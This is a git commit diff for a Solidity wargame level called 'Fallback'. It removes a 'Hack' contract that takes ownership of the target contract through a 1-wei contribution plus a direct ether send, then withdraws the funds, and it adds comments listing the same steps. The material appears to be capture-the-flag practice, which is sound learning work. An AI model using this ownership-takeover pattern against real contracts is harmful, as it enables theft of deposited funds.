e153cd9f89f02416662359d3f960d47256f47390
t4sk <tsk.nakamura@gmail.com>
2022-12-05 20:45:08 +0900

    fix

--- src/01-fallback.sol
+++ src/01-fallback.sol
@@ -1,36 +1,13 @@
 pragma solidity ^0.8;
 
+// Must claim ownership from wallet (player's address)
+// 1. fallback.contribute{value: 1}()
+// 2. address(fallback).call{value: 1}("")
+// 3. fallback.withdraw
+
 interface IFallback {
     function owner() external view returns (address);
     function contributions(address) external view returns (uint256);
     function contribute() external payable;
     function withdraw() external;
-}
-
-contract Hack {
-    IFallback private immutable target;
-
-    // withdraw
-    // call withdraw()
-
-    // Take ownership
-    // Call receive() to be owner
-    // contribution > 0 to call receive()
-    // call contribute() with < 0.001 ether
-
-    constructor(address _target) payable {
-        target = IFallback(_target);
-
-        // Call contribute() with < 0.001 ether
-        target.contribute{value: 1}();
-        // Call receive() to be owner
-        (bool ok,) = address(target).call{value: 1}("");
-        require(ok, "send failed");
-
-        target.withdraw();
-
-        selfdestruct(payable(msg.sender));
-    }
-
-    receive() external payable {}
 }
